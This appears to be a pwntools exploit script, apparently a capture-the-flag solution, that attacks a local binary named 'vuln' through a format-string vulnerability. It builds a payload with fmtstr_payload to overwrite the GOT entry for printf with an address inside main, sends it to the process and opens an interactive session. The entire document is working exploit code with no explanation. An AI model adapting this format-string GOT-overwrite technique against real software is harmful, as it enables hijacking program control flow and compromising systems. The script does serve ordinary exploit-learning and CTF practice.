from pwn import *

exe = context.binary = ELF("./vuln")
r = process()
offset = 6
rop = ROP(exe)
pay = fmtstr_payload(6,{exe.got['printf'] : exe.sym['main'] + 8},write_size='int')
print(len(pay))
r.sendline("A")
r.sendline(pay)
r.interactive()
print(len(pay))

